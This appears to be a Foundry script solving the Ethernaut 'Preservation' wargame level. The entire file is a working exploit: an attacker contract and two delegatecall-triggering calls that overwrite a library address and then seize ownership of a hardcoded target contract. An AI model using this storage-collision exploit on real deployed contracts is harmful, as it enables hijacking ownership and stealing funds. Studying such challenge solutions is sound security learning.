/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;

    function setSecondTime(uint256 _timeStamp) external;
}

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256) public {
        owner = tx.origin;
    }
}

contract Preservation is Script {
    function run() public {
        vm.startBroadcast();

        PreservationAttack preservationAttack = new PreservationAttack();
        IPreservation(0x49c5b8fbBDE4B10b6bC97D49830f0Fcfa11a754B).setFirstTime(
            uint256(uint160(address(preservationAttack)))
        );
        IPreservation(0x49c5b8fbBDE4B10b6bC97D49830f0Fcfa11a754B).setFirstTime(
            1
        );

        vm.stopBroadcast();
    }
}
